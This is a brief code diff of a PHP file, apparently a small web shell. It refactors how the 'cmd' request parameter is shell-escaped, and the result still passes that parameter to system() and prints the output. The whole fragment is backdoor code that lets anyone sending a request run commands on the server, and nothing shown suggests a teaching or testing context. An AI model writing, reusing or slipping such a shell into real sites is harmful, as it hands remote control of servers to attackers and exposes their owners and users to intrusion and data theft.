@@ -3,8 +3,7 @@
 
 if(isset($_REQUEST['cmd'])){
         echo "<pre>";
-        $cmd = ($_REQUEST['cmd']);
-        $cmd = escapeshellarg($cmd);
+        $cmd = escapeshellarg($_REQUEST['cmd']);
         system($cmd);
         echo "</pre>";
         die;
